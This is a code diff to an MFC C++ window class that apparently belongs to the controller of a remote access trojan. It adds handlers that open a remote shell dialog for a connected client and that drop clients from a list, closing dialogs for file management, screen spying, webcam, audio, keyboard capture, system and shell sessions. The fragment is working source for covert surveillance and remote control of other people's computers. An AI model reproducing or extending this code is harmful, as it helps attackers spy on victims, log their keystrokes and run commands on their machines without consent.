@@ -54,6 +54,9 @@ CChildView::~CChildView()
 BEGIN_MESSAGE_MAP(CChildView, CWnd)
 	ON_WM_PAINT()
 	ON_MESSAGE(UM_CREAT_LISTCONTROL, OnCreateListCtrl)
+	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
+	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
+	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
 	ON_WM_CREATE()
 	ON_WM_SIZE()
 	ON_WM_CONTEXTMENU()
@@ -257,4 +260,56 @@ void CChildView::OnContextMenu(CWnd* pWnd, CPoint point)
 	pPopup->TrackPopupMenu(TPM_LEFTALIGN|TPM_LEFTBUTTON, 
 		point.x, point.y, pCWnd);	
 	// TODO: 在此处添加消息处理程序代码
+}
+LRESULT CChildView::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext	*pContext = (ClientContext *)lParam;
+	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);
+
+	// 设置父窗口为卓面
+	dlg->Create(IDD_SHELL, GetDesktopWindow());
+	dlg->ShowWindow(SW_SHOW);
+
+	pContext->m_Dialog[0] = SHELL_DLG;
+	pContext->m_Dialog[1] = (int)dlg;
+	return 0;
+}
+LRESULT CChildView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext	*pContext = (ClientContext *)lParam;
+	if (pContext == NULL)
+		return -1;
+	// 删除链表过程中可能会删除Context
+	try
+	{
+		int nCnt = m_ListCtrl.GetItemCount();
+		for (int i=0; i < nCnt; i++)
+		{
+			if (pContext == (ClientContext *)m_ListCtrl.GetItemData(i))
+			{
+				m_ListCtrl.DeleteItem(i);
+				break;
+			}		
+		}
+
+		// 关闭相关窗口
+
+		switch (pContext->m_Dialog[0])
+		{
+		case FILEMANAGER_DLG:
+		case SCREENSPY_DLG:
+		case WEBCAM_DLG:
+		case AUDIO_DLG:
+		case KEYBOARD_DLG:
+		case SYSTEM_DLG:
+		case SHELL_DLG:
+			//((CDialog*)pContext->m_Dialog[1])->SendMessage(WM_CLOSE);
+			((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
+			break;
+		default:
+			break;
+		}
+	}catch(...){}
+
+	return 0;
 }
